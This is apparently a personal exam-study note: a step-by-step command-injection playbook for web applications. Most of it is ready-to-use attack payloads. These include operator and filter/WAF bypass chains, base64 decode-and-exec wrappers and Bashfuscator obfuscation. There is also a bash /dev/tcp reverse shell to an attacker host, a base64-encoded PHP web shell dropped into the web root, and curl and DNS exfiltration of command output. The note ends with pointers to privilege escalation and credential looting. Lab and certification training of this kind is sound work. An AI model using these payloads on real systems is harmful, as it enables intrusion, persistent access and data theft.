# NOTE — Command Injections Methodology (Exam Playbook)

## ID
715

## Module
Command Injections

## Kind
methodology

## Title
Command Injections — Detect → Inject → Filter-Bypass → RCE Playbook

## Description
Exam-ready playbook for OS command injection in web apps: find the injection point → confirm past front-end validation → pick a working operator → fingerprint the filter/WAF → stack character/command bypasses → escalate to a full reverse shell. Decision-tree first; every command drawn from this vault's own notes.

## Tags
methodology, command-injection, exam, cheatsheet, decision-tree, injection-operators, filter-bypass, waf-bypass, ifs, base64, obfuscation, bashfuscator, host-checker, rce

---

## TL;DR — The 6-Phase Flow

1. **Find the sink** — any input that becomes part of a shell command (ping checker, file manager, converters). Look for `system/exec/shell_exec/passthru/popen`, Node `child_process.exec`.
2. **Detect & confirm** — append an operator + test command, diff against baseline. Front-end blocking you? Go straight to Burp Repeater.
3. **Operator selection** — try every operator one at a time (`;` `%0a` `&` `&&` `|` `||` `` ` `` `$()`); note which the backend accepts.
4. **Fingerprint the filter** — isolate exactly which chars/words are blacklisted. "Invalid input" in the page = app filter; redirect/blockpage = WAF.
5. **Stack bypasses** — operator → space (`%09`/`${IFS}`) → char (`${PATH:0:1}`) → command obfuscation (`c'a't`). One layer per blocked thing.
6. **Escalate** — read the flag, then upgrade to a reverse shell / web shell. If many chars blocked → base64 the whole command (nuclear option).

> **Golden rule:** detection *is* exploitation — same technique, just a different payload. Always test the **backend** directly (Burp/curl); never trust that a blocked browser submission means the bug isn't there. Build the payload **layer by layer** — confirm the operator works *before* adding space bypass, confirm that *before* adding command obfuscation. Stacking blind wastes exam time.

> **OPSEC / time fork:** if you've stacked 3+ manual bypasses and it's still blocked, **stop hand-crafting** — base64-encode the entire command (Phase 5.D) or fire Bashfuscator. Don't burn 20 min permuting quotes. If output never reflects (blind), pivot to time-based / OOB (Phase 6.C) instead of guessing payloads forever.

---

## Phase 1 — Find the Injection Point

**Goal:** locate user input that reaches an OS shell call.

| Trigger / Precondition | This is likely a command-injection sink |
|---|---|
| App "checks" a host/IP/domain (ping, traceroute, nslookup, whois) | Backend almost always `ping -c 1 <INPUT>` |
| File manager actions: **Move / Copy / Rename / Compress / Convert** | Shells out to `mv`/`cp`/`zip`/`convert` |
| "Export to PDF", thumbnail/image convert, ZIP/backup features | `wkhtmltopdf`, ImageMagick, `tar`/`zip` calls |
| Any field whose value would plausibly be a filename or CLI arg | Concatenated into `system()`/exec |
| Error message leaks a shell error (`mv: cannot stat`, `sh: 1:`) | **Confirmed** shell execution + output channel |

Vulnerable code shapes to recall: PHP `system/exec/shell_exec/passthru/popen/proc_open`, Node `child_process.exec()` / template literals, Python `os.system`/`subprocess`, Ruby backticks/`%x{}`.

**Output checkpoint:** after this you have a candidate parameter and a guess at the backend command.

---

## Phase 2 — Detect & Confirm (Bypass Front-End First)

**You have:** a candidate parameter.
**Goal:** prove input reaches a shell.

```
# 1. Baseline — submit a normal value, record the exact response
ip=127.0.0.1

# 2. Append operator + test command, diff vs baseline
127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1 | whoami
```

**Front-end validation check (do this immediately if the browser blocks you):**

1. Submit a payload in the browser → "Please match the requested format." appears.
2. DevTools → Network tab: **no HTTP request sent** = client-side `pattern=` regex only, zero backend protection.
3. `Ctrl+U` view-source → find the `pattern` attribute on the input.
4. Intercept a *valid* request in Burp → send to Repeater (`Ctrl+R`).
5. Replace value with payload, **URL-encode it** (`Ctrl+U` in Burp), Send.
6. Response contains ping output **and** `whoami` output → **command injection confirmed.**

URL-encode map (always encode in GET / URL-encoded POST body):

| Char | Encoded | Char | Encoded |
|---|---|---|---|
| newline `\n` | `%0a` | `;` | `%3b` |
| `&` | `%26` | `|` | `%7c` |
| space | `%20` / `+` | CRLF | `%0d%0a` |

**Output checkpoint:** confirmed RCE primitive + which output channel reflects (stdout in page / error message / blind).

---

## Phase 3 — Operator Selection

**You have:** confirmed (or suspected) injection.
**Goal:** find an operator the backend accepts and that returns your output.

| Operator | Encoded | Behavior | Use when |
|---|---|---|---|
| `;` | `%3b` | Run both, sequential | Linux/PowerShell. **Fails on Windows CMD.** |
| `\n` newline | `%0a` | Run both, separate lines | Often missed by blacklists — try first if `;`/`&`/`|` blocked |
| `&&` | `%26%26` | 2nd runs only if 1st **succeeds** | You can supply a valid IP first |
| `\|\|` | `%7c%7c` | 2nd runs only if 1st **fails** | Force fail: send `|| whoami` with **no/invalid IP** |
| `\|` | `%7c` | Both run, **only 2nd's output shown** | Cleanest exfil — no ping noise |
| `&` | `%26` | Background 1st; both run | Need both regardless of exit code; output order unpredictable |
| `` `cmd` `` / `$(cmd)` | — | Inline substitution | Inject inside an existing argument |

**Output checkpoint:** one operator that executes your command AND surfaces its output.

---

## Phase 4 — Fingerprint the Filter / WAF

**Trigger:** payload returns "Invalid input" / "Malicious request denied!" but benign input works.

```
# Test ONE operator at a time — isolate exactly what's blocked
ip=127.0.0.1%0a      # newline
ip=127.0.0.1%3b      # ;
ip=127.0.0.1%26      # &
ip=127.0.0.1%7c      # |
# Then probe a space and the command word separately:
ip=127.0.0.1%0a+whoami      # space blocked?
ip=127.0.0.1%0a%09whoami    # command word blocked?
```

| Signal | Meaning |
|---|---|
| "Invalid input" rendered **in the page output** | App-level blacklist (e.g. PHP `strpos()` loop) |
| **Redirect to a separate error page** echoing your IP/request | WAF (mod_security / Cloudflare) sitting in front |
| Some operators pass, others 403 | Character blacklist — enumerate the gap |
| `&` accepted but `;`/`|` blocked | `&` likely **whitelisted as a URL separator** — prime vector |

**Output checkpoint:** an exact list of blocked operators, blocked chars, blocked command words → tells you which bypass layers you need.

---

## Phase 5 — Stack the Bypasses (One Layer per Blocked Thing)

Build the payload **incrementally**: `operator` + `space` + `chars` + `command`.

### 5.A — Space blacklisted

```
127.0.0.1%0a%09ls%09-la                 # tab (%09) — Linux + Windows, most reliable
127.0.0.1%0a${IFS}ls${IFS}-la           # $IFS — Linux only, defeats whitespace filters
127.0.0.1%0a{ls,-la}                    # brace expansion — Bash only
```
Replace **every** space, not just the first. `${IFS}` (with braces) > bare `$IFS`.

### 5.B — Character blacklisted (`/`, `\`, `;`, …)

Generate the char at shell-expansion time so the filter never sees it literally:

```
echo ${PATH:0:1}        # → /   (PATH always starts with / on Linux — most reliable)
echo ${HOME:0:1}        # → /
echo ${LS_COLORS:10:1}  # → ;   (only if LS_COLORS is set)
echo %HOMEPATH:~6,-11%  # → \   (Windows CMD)
$env:HOMEPATH[0]        # → \   (Windows PowerShell)
echo $(tr '!-}' '"-~'<<<[)   # → \  char-shift fallback (ASCII 91→92); also <<<: → ;
printenv                # recon: scan all env vars for the char you need
```
Use `${PATH:0:1}` everywhere you need a `/`: `ls /home` → `ls%09${PATH:0:1}home`.

### 5.C — Command word blacklisted (`whoami`, `cat`, `ls`)

Filter does exact string match — break the word, shell still parses it:

```
w'h'o'am'i      # single quotes — Linux + Windows (EVEN count, NO mixing)
w"h"o"am"i      # double quotes — Linux + Windows
who$@ami        # $@ expands to nothing — Linux only
w\ho\am\i       # backslash — Linux only, any count
who^ami         # caret — Windows CMD only
```

### 5.D — Many chars blocked → base64 the whole command (nuclear option)

```
# 1. Encode the full command locally (echo -n = NO trailing newline!)
echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64

# 2. Decode + exec on target via here-string (<<< replaces a blocked pipe)
ip=127.0.0.1%0abash<<<$(base64%09-d<<<<BASE64STRING>)
#   only filtered char left is the space in `base64 -d` → %09

# Alternatives if base64/bash themselves are blocked:
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")        # case manipulation
$(rev<<<'imaohw')                        # reversed command (echo cmd|rev locally first)
echo <B64> | xxd -r -p | sh              # hex instead of base64 (+ / = blocked)
b'a's'h' / b'a'se64                      # quote-obfuscate the wrapper itself

# Windows PowerShell base64 (must be UTF-16LE):
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<B64>')))"
```

### 5.E — Full canonical chain (all four layers stacked)

```
ip=127.0.0.1%0a%09c'a't%09${PATH:0:1}home${PATH:0:1}<USER>${PATH:0:1}flag.txt
#       └op   └sp  └cmd     └ "/"            "/"          "/"
```

### 5.F — Manual stacking exhausted → automated obfuscator

```
git clone https://github.com/Bashfuscator/Bashfuscator
pip3 install setuptools==65 && python3 setup.py install --user
./bashfuscator -c '<COMMAND>' -s 1 -t 1 --no-mangling --layers 1   # compact output
bash -c '<OBFUSCATED>'        # ALWAYS test locally before injecting
# Windows: Invoke-DOSfuscation (Import-Module .\Invoke-DOSfuscation.psd1 → SET COMMAND → encoding → 1)
```

**Output checkpoint:** a payload that returns the output of an arbitrary command (e.g. flag contents).

---

## Phase 6 — Escalate

### 6.A — From file read → reverse shell

```
# Confirm interpreter, then upgrade. URL-encode the whole thing in Burp.
127.0.0.1%0a%09bash%09-c%09'bash -i >& /dev/tcp/<ME>/<PORT> 0>&1'
# If chars blocked, base64 the rev-shell one-liner via Phase 5.D and bash<<<$(base64 -d<<<...)
# Listener FIRST: nc -lvnp <PORT>
```
Chains into → `[[../shells-payloads/00-METHODOLOGY]]` (TTY upgrade, payload selection).

### 6.B — Web shell drop (when egress is filtered)

```
# Write a webshell into the web root using only allowed chars
127.0.0.1%0a%09echo${IFS}PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+|base64${IFS}-d>${PATH:0:1}var${PATH:0:1}www${PATH:0:1}html${PATH:0:1}s.php
# then: curl http://<TARGET>/s.php?c=id
```

### 6.C — Blind injection (no output reflected)

```
# Time-based oracle
127.0.0.1%0a%09sleep%095        # response delayed 5s = command ran
# OOB exfil
127.0.0.1%0a%09curl%09http://<ME>/$(whoami)      # read attacker access log
127.0.0.1%0a%09nslookup%09$(whoami).<ME>          # DNS exfil
```
Pair the file-manager *Move/error* trick: pick a destination that makes `mv` **fail** so its stderr reflects your command output.

### 6.D — Post-exploit pivot

Web user is usually low-priv (`www-data`) → hand off to:
- `[[../linux-privallege-escalation/00-METHODOLOGY]]` / `[[../windows-privesc/00-METHODOLOGY]]`
- Loot DB/web creds from config → `[[../password-attacks/00-METHODOLOGY]]`

---

## Decision Tree (Under Exam Pressure)

```
You have a web app:
│
├── input "checks" host/IP, or file action (Move/Copy/Convert)
│   └── Phase 2: append `; whoami` / `| whoami`, diff baseline
│       ├── browser blocks, NO network request → front-end only
│       │   └── Burp Repeater + Ctrl+U URL-encode → resend
│       └── reaches backend → CONFIRMED
│
├── confirmed but "Invalid input" / "Malicious request denied!"
│   └── Phase 4: test ONE operator at a time
│       ├── `%0a` passes → use newline as operator
│       ├── `&`(%26) passes, rest blocked → likely whitelisted URL sep — use it
│       └── ALL operators blocked → STUCK > 10 min → it may be WAF;
│           go straight to base64 wrapper (5.D) or Bashfuscator
│
├── operator works, "Invalid input" returns on full payload
│   └── isolate the blocked piece, add ONE layer:
│       ├── space blocked → %09  (or ${IFS}, {a,b})
│       ├── `/` blocked   → ${PATH:0:1}
│       ├── cmd word blocked → c'a't / w\ho\am\i / who$@ami
│       └── 3+ blocked   → STOP stacking → base64 whole cmd (5.D)
│
├── payload runs but NO output (blind)
│   └── sleep 5 (timing) → curl/nslookup OOB exfil
│       └── file-manager? force the mv/cp to FAIL → stderr reflects
│
├── got command output / flag
│   └── upgrade: bash -c rev-shell → listener FIRST
│       └── then privesc methodology (low-priv www-data)
│
└── STUCK > 20 min
    ├── grep ../ATTACK-PATHS.md for the exact symptom
    ├── re-test EVERY operator incl. `\n`,`&&`,`` ` ``,`$()` individually
    ├── try the OTHER parameter (file mgr: `from` as well as `to`)
    ├── GET→POST or POST→GET swap; $_GET vs $_REQUEST
    └── nuclear: base64 entire cmd OR Bashfuscator -s 1 --layers 1
```

---

## Signal → Counter-Move Reference

| You see / observe | Likely cause | Counter-move |
|---|---|---|
| Browser: "Please match the requested format." | Client-side `pattern=` regex, no request sent | DevTools→Network confirms; replay via Burp Repeater |
| Payload works in Repeater, fails in browser | Front-end validation only | Always test backend; ignore the browser |
| `&` in payload truncates the request | Interpreted as HTTP param separator | URL-encode `&` → `%26` |
| "Invalid input" in the page body | App-level char/word blacklist | Phase 4: isolate the blocked token, add one bypass layer |
| Redirect to error page echoing your request | WAF in front | Skip manual perms — base64 wrapper / Bashfuscator |
| `%0a%09whoami` → still "Invalid input" | Command **word** blacklisted (op+space passed) | Obfuscate: `w'h'o'am'i` / `w\ho\am\i` |
| `&&` payload silently does nothing | First command failed → `&&` short-circuits | Use `&`, `%0a`, or supply a valid IP first |
| `\|\|` never triggers 2nd command | First command **succeeded** → `\|\|` short-circuits | Send `\|\| cmd` with **no/invalid** first arg |
| Only ping output, no injected output | Used `\|` but expecting both | `\|` shows ONLY 2nd cmd's output — that's correct, read that |
| `;` works on Linux box but not Windows | CMD doesn't support `;` | Use `&`/`&&`/`\|`; `;` only on PowerShell/Linux |
| `${LS_COLORS:10:1}` returns nothing | Var not set on minimal host | Fall back to `${PATH:0:1}` for `/` |
| `{ls,-la}` not expanding | Target shell is `sh`/`dash`, not Bash | Use `%09` or `${IFS}` instead |
| `<<<` here-string errors | Non-Bash shell | `echo <B64>\|base64 -d\|sh` (bypass the `\|` separately) |
| base64 payload mangled / breaks | trailing newline in source | re-encode with `echo -n`, no newline |
| base64 string contains `+ / =` and blocked | filter eats base64 alphabet | hex instead: `xxd -r -p` |
| File-manager injection runs but no output | Operation **succeeded** silently | Make it FAIL (bad destination) so stderr reflects |
| Reverse shell never connects | Listener not up before payload | `nc -lvnp <PORT>` FIRST, then fire payload |
| Bashfuscator output huge / app truncates | No size limits set | `-s 1 -t 1 --no-mangling --layers 1` |

---

## Master Cheatsheet — One-Liners by Scenario

```bash
# === Scenario 1: Detect (diff against 127.0.0.1 baseline) ===
127.0.0.1; whoami
127.0.0.1%0a whoami
127.0.0.1 | whoami

# === Scenario 2: Front-end blocked — backend test ===
# Burp: intercept valid req → Ctrl+R → set ip=127.0.0.1;whoami → Ctrl+U → Send

# === Scenario 3: Enumerate blocked operators (one at a time) ===
ip=127.0.0.1%0a   ; ip=127.0.0.1%3b   ; ip=127.0.0.1%26   ; ip=127.0.0.1%7c

# === Scenario 4: Space blacklisted ===
127.0.0.1%0a%09ls%09-la
127.0.0.1%0a${IFS}ls${IFS}-la
127.0.0.1%0a{ls,-la}

# === Scenario 5: Slash blacklisted (list /home) ===
127.0.0.1%0a%09ls%09${PATH:0:1}home

# === Scenario 6: Command word blacklisted (read flag) ===
127.0.0.1%0a%09c'a't%09${PATH:0:1}home${PATH:0:1}<USER>${PATH:0:1}flag.txt

# === Scenario 7: Many chars blocked — base64 nuclear ===
echo -n '<FULL_COMMAND>' | base64
ip=127.0.0.1%0abash<<<$(base64%09-d<<<<BASE64STRING>)

# === Scenario 8: File-manager Move (skills-assessment pattern) ===
echo 'cat /flag.txt' | base64                       # → Y2F0IC9mbGFnLnR4dA==
/index.php?to=tmp$IFS%26c"a"t$IFS${PATH:0:1}flag.txt&from=<FILE>&finish=1&move=1
/index.php?to=tmp$IFS%26b"a"sh<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==)&from=<FILE>&finish=1&move=1

# === Scenario 9: Blind — confirm + exfil ===
127.0.0.1%0a%09sleep%095
127.0.0.1%0a%09curl%09http://<ME>/$(whoami)

# === Scenario 10: Reverse shell (listener FIRST) ===
nc -lvnp <PORT>
127.0.0.1%0a%09bash%09-c%09'bash -i >& /dev/tcp/<ME>/<PORT> 0>&1'

# === Scenario 11: Automated obfuscation ===
./bashfuscator -c '<COMMAND>' -s 1 -t 1 --no-mangling --layers 1
bash -c '<OBFUSCATED>'      # test locally first
```

---

## Quick Reference — Tools / Techniques by Function

| Function | Technique / Tool |
|---|---|
| Intercept + replay (front-end bypass) | Burp Repeater (`Ctrl+R`), `Ctrl+U` to URL-encode, ZAP, `curl` |
| Operators | `;` `\n`(%0a) `&` `&&` `\|` `\|\|` `` ` `` `$()` |
| Space bypass | `%09` (tab), `${IFS}`, `{cmd,arg}` brace expansion |
| Char generation | `${PATH:0:1}`=`/`, `${LS_COLORS:10:1}`=`;`, `tr` char-shift, Win `%VAR:~s,l%` / `$env:VAR[i]` |
| Command obfuscation | quotes `c'a't` / `c"a"t`, `\`, `$@`, Win `^`, `rev`, case via `tr`/`${a,,}` |
| Encode whole command | `base64`/`base64 -d`, `xxd -r -p` (hex), here-string `<<<` (pipe replacement) |
| Recon env vars on target | `printenv` |
| Automated obfuscation | Bashfuscator (Linux), Invoke-DOSfuscation (Windows CMD/PS) |
| Blind confirm / exfil | `sleep`, `curl`/`wget` to attacker, `nslookup`/DNS, force `mv`/`cp` error |
| Escalate | `bash -i >& /dev/tcp/...`, PHP webshell via `base64 -d`, then privesc module |

---

## Top Gotchas (Things That Will Burn You)

1. **Front-end validation ≠ protection.** No HTTP request on submit = client-side `pattern=` only. The backend has zero filtering — always replay via Burp/curl. Burning time "defeating" a regex that only exists in the browser is the #1 waste.
2. **Always URL-encode operators** in GET / URL-encoded POST bodies. A raw `&` becomes an HTTP parameter separator and silently truncates your payload. `&`→`%26`, `;`→`%3b`, `|`→`%7c`, newline→`%0a`.
3. **`;` does NOT work on Windows CMD** (only PowerShell/Linux). On CMD use `&`, `&&`, `|`.
4. **`&&` needs the first command to succeed; `||` needs it to fail.** A "dead" payload is often just operator logic — for `||`, send it with *no* valid first argument so the first command fails.
5. **`|` shows only the SECOND command's output.** It's not broken — the ping output is gone by design. Best operator for clean exfil.
6. **Replace EVERY space**, not just the first. `ls -la` needs two substitutions: `ls%09-la`.
7. **Quote obfuscation rules:** count must be **even**, and you **cannot mix** single and double quotes in the same word. `w'h'o'am'i` good; `w'h"o"ami` broken.
8. **`{a,b}` brace expansion and `<<<` here-string are Bash-only.** If the target shell is `sh`/`dash` they fail silently — fall back to `%09`/`${IFS}` and `echo|base64 -d|sh`.
9. **`echo -n` when base64-encoding.** A trailing newline changes the encoded string and breaks decode-and-exec.
10. **`${PATH:0:1}` is the reliable `/`** — PATH always starts with `/` on Linux. `${LS_COLORS:10:1}` depends on that var being set; don't rely on it on minimal hosts.
11. **If `$` is blacklisted**, `$@`, `${PATH:0:1}`, `$(...)` and `${IFS}` all die together — fall back to `tr` char-shifting or quote insertion only.
12. **base64 alphabet (`+ / =`) may itself be filtered.** Switch to hex (`xxd -r -p`) if so.
13. **File-manager injections need the command to FAIL** for output to reflect (stderr channel). Pick an invalid destination; use `&` not `&&` (which would suppress the payload when `mv` fails).
14. **Test every operator individually** — `&` is frequently *whitelisted* as a URL separator while `;`/`|` are blocked. The whitelisted operator is your way in.
15. **Listener BEFORE payload**, always. A reverse shell that never connects = `nc -lvnp` wasn't running yet.
16. **Test obfuscator output locally** (`bash -c '<out>'`) before injecting. Bashfuscator with no limits emits million-char payloads that crash/truncate the app — always `-s 1 --layers 1 --no-mangling`.
17. **PHP `strpos()` blacklists are case-sensitive** — but Linux commands are too, so `WHOAMI` bypasses the filter yet won't execute on Linux (it *would* on Windows).
18. **Stack incrementally.** Confirm operator → then add space bypass → then char → then command. Building the full 4-layer payload blind and getting "Invalid input" tells you nothing about *which* layer failed.

---

## Related Vault Notes

- `[[01-intro]]` — injection family, vulnerable PHP/Node code shapes
- `[[02-detection]]` — operator append + baseline diff (Host Checker)
- `[[03-injecting-commands]]` — front-end bypass via Burp
- `[[04-other-injection-operators]]` — `&& || | & %0a` behavior differences
- `[[05-command_injections_identifying_filters]]` — one-operator-at-a-time fingerprinting; app filter vs WAF
- `[[06-command_injections_bypassing_space_filters]]` — `%09`, `${IFS}`, brace expansion
- `[[07-command_injections_bypassing_other_blacklisted_chars]]` — `${PATH:0:1}`, env slicing, char-shift
- `[[08-command_injections_bypassing_blacklisted_commands]]` — quote/backslash/`$@`/caret obfuscation
- `[[09-command_injections_advanced_obfuscation]]` — base64, case, reverse, Windows PS encoding
- `[[10-evasion-tools]]` — Bashfuscator / Invoke-DOSfuscation
- `[[11-defense]]` — prevention (report remediation section)
- `[[12-command_injections_skills_assessment]]` — file-manager Move chain (`&` whitelisted, $IFS, ${PATH:0:1}, base64)

External cross-vault:
- Post-exploit shell upgrade: `[[../shells-payloads/00-METHODOLOGY]]`
- Web-user → root/SYSTEM: `[[../linux-privallege-escalation/00-METHODOLOGY]]`, `[[../windows-privesc/00-METHODOLOGY]]`
- Looted DB/config creds: `[[../password-attacks/00-METHODOLOGY]]`
- Request manipulation / encoding: `[[../web-proxies/04-intercepting-requests]]`, `[[../web-proxies/08-encoding-decoding]]`
- Triage by symptom: `[[../ATTACK-PATHS]]` §3 (Web app — by symptom)
- Index: `[[../SEARCH]]` · Exam pitfalls: `[[../EXAM-WARNINGS]]`
